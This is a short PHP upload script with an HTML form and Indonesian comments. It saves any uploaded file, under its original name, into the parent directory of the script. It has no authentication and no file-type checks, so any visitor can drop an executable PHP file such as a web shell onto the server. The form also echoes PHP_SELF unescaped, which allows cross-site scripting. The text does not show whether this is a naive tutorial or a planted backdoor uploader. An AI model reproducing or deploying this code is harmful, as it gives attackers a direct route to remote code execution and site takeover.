<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Direktori saat ini
    $currentDir = dirname(__FILE__);

    // Direktori target (satu tingkat di atas direktori saat ini)
    $targetDir = $currentDir . '/../';

    $targetFile = $targetDir . basename($_FILES['fileToUpload']['name']);

    // Proses unggah file
    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
        echo "File ". basename($_FILES['fileToUpload']['name']). " telah diunggah.";
    } else {
        echo "Maaf, terjadi kesalahan dalam mengunggah file Anda.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Upload File</title>
</head>
<body>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
        Pilih file untuk diunggah:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="Upload File" name="submit">
    </form>
</body>
</html>
